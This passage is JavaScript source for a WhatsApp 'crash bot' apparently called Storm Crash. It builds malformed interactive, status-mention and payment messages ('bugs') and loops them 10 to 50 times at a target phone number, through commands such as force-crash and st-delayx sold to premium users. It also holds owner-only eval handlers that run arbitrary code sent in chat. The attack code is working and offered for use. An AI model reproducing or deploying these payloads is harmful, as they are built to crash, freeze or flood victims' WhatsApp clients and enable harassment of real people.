        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await prim.relayMessage(target, {
            groupStatusMentionMessage: {
                message: { protocolMessage: { key: msg.key, type: 25 } }
            }
        }, {
            additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
        });
    }
    }
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function Wraperos2(target) {
let apiClient = JSON.stringify({
    status: true,
    criador: "Storm WhatsApp Api",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Arya Valensya",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⍣𐎟𑆻⃔",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://youtube.com/@limmvz",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⍣𐎟𑆻⃔",
            },
            nativeFlowMessage: {
              messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"galaxy_message\",\"header\":\"Arya Official\",\"body\":\"Call Galaxy\"}",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: apiClient + "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⍣𐎟𑆻⃔",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: apiClient + "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠 ⍣𐎟𑆻⃔",
                }, 
                {
                  name: "payment_method",
                  buttonParamsJson: ""
                },
                {
                  name: "payment_status",
                  buttonParamsJson: ""
                },
                {
                  name: "review_order",
                  buttonParamsJson: ""
                },
              ],
            },
          },
        },
      },
    },
    {}
  ); 

  await prim.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

// End func
async function kuota(target) {
    for (let i = 0; i < 30; i++) {
    await protocol6(target);
    await bulldozer(target);
    await protocolbug5(target);
    }
}
async function blank(target) {
    for (let i = 0; i <= 10; i++) {
    await invico1(target)
    await UiScorpio(target)
    }
}
async function fc(target) {
    for (let r = 0; r < 50; r++) {
    await Wraperos2(target);
    }
}
async function proto6(target) {
    for (let r = 0; r < 20; r++) {
    await protocolbug3(target);
    await protocol6(target);
    await protocolbug4(target)
    }
}
async function invis(target) {
    for (let i = 0; i < 20; i++) {
    await InVisibleX1(target, true);
    }
}
async function delay3(target) {
    for (let r = 0; r < 20; r++) {
    await NotifFreeze(target);
    await protocol6(target);
    await protocolbug3(target);
    await InVisibleX1(target, true);
    await protocol6(target);
    await invisiblenew(target);
    await protocolbug3(target);
    await InVisibleX1(target, true);
    }
}
async function anjaz(target) {
    for (let i = 0; i < 10; i++) {
    await Wraperos2(target);
    await prim5(target, true);
    await NotifFreeze(target);
    }
}
async function combo(target) {
    for (let r = 0; r < 20; r++) {
    await Wraperos2(target);
    await prim5(target);
    await NotifFreeze(target);
    await protocol6(target, mention = true)
    await protocolbug3(target, true);
    await invisiblenew(target);
    await protocolbug3(target);
    await InVisibleX1(target, true);
    await protocolbug4(target);
    await invico1(target)
    await UiScorpio(target)    
    await bulldozer(target);
    await protocolbug5(target);           
    }
}

const jem = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "1212121212",
      status: "INQUIRY",
      surface: "",
      message: `𒆜𝗠𝗿 𝗦𝘁𝗼𝗿𝗺!!!`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363378510313540@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const RC = fs.readFileSync('./media/storm.jpg')
const replyLFH = (teks) => {
    return prim.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𒆜𝗠𝗿 𝗦𝘁𝗼𝗿𝗺!!!`,
                body: `𝐃̳𝐞̳𝐯̳𝐞̳𝐥̳𝐨̳𝐩̳𝐞̳𝐫̳`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: "https://files.catbox.moe/k0l29a.jpg",
                sourceUrl: `https://whatsapp.com/channel/0029VbA8bWXKmCPZ2EFhAA0Y`
            }
        }
    }, { quoted: jem });
}

const bugres = `╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : Understand the Target🤓👆
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ᴘʀᴏᴄᴇss ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ 5 minute break ｠
╰━━━━━━━━━━━━━━━━━⬣`

//END FUNC DLL
//END END

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Storm 𝐕1.𝟎.𝟎`, 'vcard': `BEGIN:VCARD\nVERSION:8.5\nN:XL;𝐋𝐢𝐚𝐦,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://files.catbox.moe/1ilypq.jpg' }}}}
const qlocmenu = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Full Verification Of Whatsapp`,jpegThumbnail: ""}}}
const reaction = async (from, emoji) => {
    prim.sendMessage(from, {
        react: { text: emoji,
                key: m.key 
               } 
            }
        );
    };
// Command handler
switch (command) {

case "menu": {
let anj = `

*┏━━ ⚡ 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 ⚡ ━━┓*
> ┃⚡│ ʙᴏᴛ ɴᴀᴍᴇ: *ᖫ 𝐒𝐓𝐎𝐑𝐌 ⚡ 𝐂𝐑𝐀𝐒𝐇 √1 ᖭ*
> ┃⚡│ ᴠᴇʀsɪᴏɴ: *1.0.0*
> ┃⚡│ ᴍᴏᴅᴇ: ${prim.public ? '𝗣𝘂𝗯𝗹𝗶𝗰' : '𝗦𝗲𝗹𝗳'}
> ┃⚡│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *MR STORM*
> ┃⚡│ ᴘʟᴀᴛᴇғᴏʀᴍᴇ: *PANEL*
> ┃⚡│ ᴘʀᴇғɪx: *${prefix}*
> ┃⚡│ ᴛɪᴍᴇ: ${runtime(process.uptime())}
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ ⚡ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ⚡ ━━┓*
> ┃⚡│ ➤ *${prefix}addprem*
> ┃⚡│ ➤ *${prefix}delprem*
> ┃⚡│ ➤ *${prefix}public*
> ┃⚡│ ➤ *${prefix}self*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ ⚡ 𝐒𝐓𝐎𝐑𝐌 𝐁𝐔𝐆𝐒 ⚡ ━━┓*
> ┃⚡│ ➤ *${prefix}storm-shadow*
> ┃⚡│ ➤ *${prefix}storm-void*
> ┃⚡│ ➤ *${prefix}storm-blast*
> ┃⚡│ ➤ *${prefix}storm-night*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ ⚡ 𝐁𝐋𝐀𝐍𝐊 𝐁𝐔𝐆𝐒 ⚡ ━━┓*
> ┃⚡│ ➤ *${prefix}blank-zero*
> ┃⚡│ ➤ *${prefix}blank-fade*
> ┃⚡│ ➤ *${prefix}blank-glitch*
> ┃⚡│ ➤ *${prefix}blank-dark*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ ⚡ 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 𝐁𝐔𝐆𝐒 ⚡ ━━┓*
> ┃⚡│ ➤ *${prefix}force-omega*
> ┃⚡│ ➤ *${prefix}force-home*
> ┃⚡│ ➤ *${prefix}force-crash*
> ┃⚡│ ➤ *${prefix}force-dragon*
> ┃⚡│ ➤ *${prefix}force-storm*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ ⚡ 𝐒𝐓 𝐁𝐔𝐆𝐒 ⚡ ━━┓*
> ┃⚡│ ➤ *${prefix}st-phantom*
> ┃⚡│ ➤ *${prefix}st-shadow*
> ┃⚡│ ➤ *${prefix}st-venom*
> ┃⚡│ ➤ *${prefix}st-delayx*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

*┏━━ ⚡ 𝐄𝐓𝐄𝐊𝐄𝐑 𝐁𝐔𝐆𝐒 ⚡ ━━┓*
> ┃⚡│ ➤ *${prefix}etek-invisx*
> ┃⚡│ ➤ *${prefix}etek-storm*
> ┃⚡│ ➤ *${prefix}etek-core*
> ┗━━━━━━━━━━━━━━━━━━━━━━┛

> © ⚡ *Mr Storm*

`
await loadmenugoz()
await prim.sendMessage(m.chat, {
image: { url: "https://files.catbox.moe/k0l29a.jpg" },
caption: anj,
contextInfo: {
mentionedJid: [m.sender],
forwardedNewsletterMessageInfo: {
newsletterName: "𝕻𝖗𝖎𝖒𝖎𝖘",
newsletterJid: "120363404759959596@newsletter"
},
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
title: global.namabot,
body: "ᖫ𝐒𝐓𝐎𝐑𝐌 ⚡ 𝐂𝐑𝐀𝐒𝐇 √1ᖭ",
mediaType: 3,
renderLargerThumbnail: false,
thumbnail: babi,
sourceUrl: "https://whatsapp.com/channel/0029VbBIwwK4tRrr0GWdPZ46"
}
}
}, {quoted: lol });
await prim.sendMessage(m.chat, {
audio: musicprim,
mimetype: 'audio/mpeg',
ptt: true
}, {quoted: fkontak });
}
break;
case 'storm-shadow': 
case 'storm-void':
case 'storm-blast':
case 'storm-night': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *Use*: ${prefix + command} 50940xxxxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
await blank(target)
await blank(target)
await fc(target)
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ 5 minute break ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'blank-zero': 
case 'blank-fade':
case 'blank-glitch':
case 'blank-dark': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *Ise*: ${prefix + command} 50931xxxxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
await kuota(target)
await kouta(target)
await invis(target)
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ 5 minute break ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'force-omega':
case 'force-home':
case 'force-crash':
case 'force-dragon':
case 'force-storm': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *Use*: ${prefix + command} 50931xxxxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
await proto6(target)
await anjaz(target)
await fc(target)
await proto6(target)
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ 5 minute break ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'st-phantom':
case 'st-shadow':
case 'st-venom':
case 'st-delayx': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *Use*: ${prefix + command} 50931xxxxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
await combo(target)
await combo(target)
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ 5 minute break ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'etek-invisx':
case 'etek-storm':
case 'etek-core': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replyLFH(`❓ *Use*: ${prefix + command} 50931xxxxxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyLFH(bugres)
await invis(target)
await combo(target)
await kouta(target)
await fc(target) 
replyLFH(`╭━〔 𝙎̸̪̑̉𝙐̸̭̣͎̯͆̆𝘾̷̝̿̔̆𝘾̸̺̻̯͗̂̚͠𝙀̸̧̓̐̓̌𝙎̴͚̩̕ 𝙎̴͉̳̈͗̀𝙀̷̝̯̞̈́𝙉̷̣͐̈̏𝘿̷̢̛̺͙̯ 𝘽̵̞̱̃͌̓͜𝙐̵̮͚̀͊̌͊𝙂̵̻̯͓̭̓ 〕━⬣
┇
┇ 𝐓̲̲̅̅͟𝐘̲̲̅̅͟𝐏̲̲̅̅͟𝐄̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ ${command} ｠
┇
┇ 𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐑̲̲̅̅͟𝐆̲̲̅̅͟𝐄̲̲̅̅͟𝐓̲̲̅̅͟ : ｟ ${target} ｠
┇
┇ 𝐒̲̲̅̅͟𝐓̲̲̅̅͟𝐀̲̲̅̅͟𝐓̲̲̅̅͟𝐔̲̲̅̅͟𝐒̲̲̅̅͟ 𝐁̲̲̅̅͟𝐔̲̲̅̅͟𝐆̲̲̅̅͟ : ｟ sᴜᴄᴄᴇs ｠
┇
┇ 𝐍̲̲̅̅͟𝐎̲̲̅̅͟𝐓̲̲̅̅͟𝐄̲̲̅̅͟ : ｟ 5 minute break ｠
╰━━━━━━━━━━━━━━━━━⬣`)
}
break
case 'addprem': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
    const kata = args.join(" ")
    const nomor = kata.split("|")[0];
    const hari = kata.split("|")[1];
    if (!nomor) return replyLFH(`*Enter the number you want to add premium for example* : ${prefix + command} @tag|30d`)
    if (!hari) return replyLFH(`*Addprem how many days?*`)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : nomor.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    if (owner.includes(users)) return replyLFH('*You are already premium*')
    const idExists = _prem.checkPremiumUser(users)
    if (idExists) return replyLFH('*Success addprem* ✅')
    let data = await prim.onWhatsApp(users)
    if (data[0].exists) {
        _prem.addPremiumUser(users, hari)
        await sleep(3000)
        let cekvip = ms(_prem.getPremiumExpired(users) - Date.now())
        let teks = ('*Success addprem*')
        const contentText = {
            text: teks,
            contextInfo: {	
                externalAdReply: {
                    title: `𝐒𝐓𝐎𝐑𝐌 ⚡ 𝐂𝐑𝐀𝐒𝐇 √1ᖭ`,
                    previewType: "PHOTO",
                    thumbnailUrl: `https://files.catbox.moe/k0l29a.jpg`,
                    sourceUrl: 'https://whatsapp.com/channel/0029VbAqjwm1CYoTLEg7KR44'
                }	
            }	
        };	
        return prim.sendMessage(m.chat, contentText, { quoted: jem })
    } else {		
         replyLFH("not found")
    }	
}
break       
case 'delprem': {
if (!isPremium) return replyLFH('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
    if (!args[0]) return replyLFH(`𝚂𝙸𝙰𝙿𝙰 𝚈𝙰𝙽𝙶 𝙼𝙰𝚄 𝙳𝙸 *Who wants to be* ${command}? *Enter number or tag example* : ${prefix} delprem @50931xxxxxx`)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    const idExists = _prem.checkPremiumUser(users)
    if (!idExists) return replyLFH("𝙽𝙾𝚃 𝚄𝚂𝙴𝚁 𝙿𝚁𝙴𝙼𝙸𝚄𝙼")
    let data = await prim.onWhatsApp(users)
    if (data[0].exists) {	
        let premium = JSON.parse(fs.readFileSync('./lib/database/premium.json'));
        premium.splice(_prem.getPremiumPosition(users), 1)
        fs.writeFileSync('./lib/database/premium.json', JSON.stringify(premium))		
        replyLFH('*Successfully number has been deleted*')
    } else {	
        replyLFH("not found")
    }
}
break

case 'public': {
if (!isPremium) return replyLFH(mess.owner) 
if (prim.public === true) return replyLFH("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
prim.public = true
replyLFH(mess.succes)
}
break

//======================

case 'self': {
if (!isPremium) return replyLFH(mess.owner) 
if (prim.public === false) return replyLFH("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
prim.public = false
replyLFH(mess.succes)
}
break


default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
